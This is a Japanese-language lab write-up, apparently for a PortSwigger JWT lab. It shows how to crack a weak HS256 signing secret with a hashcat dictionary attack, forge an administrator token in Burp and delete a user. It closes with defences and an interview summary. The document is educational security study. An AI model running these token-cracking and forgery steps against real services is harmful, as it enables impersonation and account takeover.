

### 1. Burp で JWT を取る（ここまではできてる）

1. **`wiener:peter` でログイン**
2. **Proxy → HTTP history** で `/my-account` を開く
3. リクエストヘッダの `Cookie` を見る：

   ```http
   Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.x6BLkxlHWd0fL2u790Rt4sBNTrHh0qw_8u_X3cWzT68
   ```

4. `session=` の **右側全部** をコピーする：

   ```text
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.x6BLkxlHWd0fL2u790Rt4sBNTrHh0qw_8u_X3cWzT68
   ```

ここからが hashcat パート。

---

### 2. JWT をファイルに保存する（jwt.hash）

1. 適当にフォルダを作る（例）：

   ```text
   C:\jwt-lab\
   ```

2. その中に `jwt.hash` というファイルを作る
3. 中身を **さっきコピーした JWT をそのまま1行** だけ書く：

   ```text
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.x6BLkxlHWd0fL2u790Rt4sBNTrHh0qw_8u_X3cWzT68
   ```

※デコードしない・分割しない・改行入れない。

---

### 3. ワードリストを用意する（jwt.secrets.list）

1. 同じ `C:\jwt-lab\` に `jwt.secrets.list` を作る
2. とりあえずテスト用にこう書いておく：

   ```text
   password
   123456
   secret
   secret1
   admin
   ```

実際のラボではもっと長いリストが配られてるはずだけど、仕組み理解ならこれで十分。

---

### 4. PowerShell を開いて hashcat のフォルダへ移動

1. Windowsキー →「powershell」→ **Windows PowerShell** を開く
2. hashcat を解凍した場所に移動する（例）：

   ```powershell
   cd "C:\Users\あなたの名前\Downloads\hashcat-6.2.6"
   ```

ここで `.\hashcat.exe` が見えてる状態にする。

---

### 5. hashcat を実行するコマンド

PowerShell でこう打つ：

```powershell
.\hashcat.exe -m 16500 -a 0 C:\jwt-lab\jwt.hash C:\jwt-lab\jwt.secrets.list
```

- **`-m 16500`** → JWT HS256 モード
- **`-a 0`** → 辞書攻撃
- `C:\jwt-lab\jwt.hash` → 割りたい JWT
- `C:\jwt-lab\jwt.secrets.list` → 試す秘密鍵候補

---

### 6. 結果の確認

うまくいくと、実行中か `--show` でこう出る：

```powershell
.\hashcat.exe -m 16500 --show C:\jwt-lab\jwt.hash
```

出力例：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....:secret1
```

この `secret1` が「見つかった秘密鍵」。

---

### 7. あとは今日やった通り Burp に戻る

1. `secret1` を Base64 → `c2VjcmV0MQ==`
2. JWT Editor → Keys → New Symmetric Key → `k` を `c2VjcmV0MQ==` に書き換え
3. `"sub": "wiener"` → `"sub": "administrator"` にして Sign → Send

---

ここまでが **「Burp で JWT コピーしたあと、実際に hashcat を叩いて secret1 を見つけるまで」** の一本の線。
<br>
<br>
<br>
<br>


---

# 🟥 1. どーいう脆弱性？
### **JWT の署名に “弱い秘密鍵（secret1 など）” を使っていた**
- JWT は **署名（HMAC-SHA256）** によって改ざんを防ぐ仕組み
- しかし秘密鍵が弱いと、攻撃者が **総当たりで秘密鍵を推測できる**
- 秘密鍵が割れた瞬間、攻撃者は **好きなユーザーに成りすました JWT を自分で作れる**

---

# 🟦 2. どう気づいた？
### **Cookie に JWT が入っていた → デコードして中身を確認 → 署名を検証**
- Cookie が `eyJ…` で始まっていたので **JWT と判断**
- Base64 デコードすると `"sub": "wiener"` が見える  
  → **署名が弱い可能性を疑う**
- JWT の署名部分を使って **hashcat で秘密鍵を総当たり**  
  → `secret1` がヒット  
  → **弱い鍵を使っていると確信**

---

# 🟩 3. どう攻撃した？
### **秘密鍵を使って “管理者の JWT” を自分で作った**
1. 見つけた秘密鍵 `secret1` を Base64 エンコードして JWK に設定  
2. JWT の `"sub": "wiener"` を `"sub": "administrator"` に書き換え  
3. 自分の秘密鍵で署名し直す  
4. サーバーは署名を信じて **攻撃者を管理者として扱う**  
5. `/admin/delete?username=carlos` を実行してアカウント削除

---

# 🟧 4. どう対策する？
### **強い秘密鍵＋鍵管理＋アルゴリズム設定の固定**
- **十分に長くランダムな秘密鍵（32バイト以上）を使用**
- 秘密鍵を **環境変数・KMS などで安全に管理**
- JWT の `alg` を **サーバー側で固定（HS256 以外を拒否）**
- 署名鍵を **定期的にローテーション**
- 可能なら **HS256 → RS256（公開鍵暗号）** に移行

---

# 🟪 5. 30秒面接用まとめ（和志の面接テンプレ）

> **「JWT の署名鍵が弱いことで、攻撃者が秘密鍵を総当たりで推測できる脆弱性です。Cookie に JWT が入っていたのでデコードして確認し、署名部分を hashcat で総当たりしたところ `secret1` が見つかりました。秘密鍵が割れたため、`sub` を administrator に書き換えて自分で署名し直し、管理者としてアクセスできました。対策は十分に長いランダムな秘密鍵の使用、鍵管理の強化、アルゴリズムの固定、鍵のローテーションです。」**

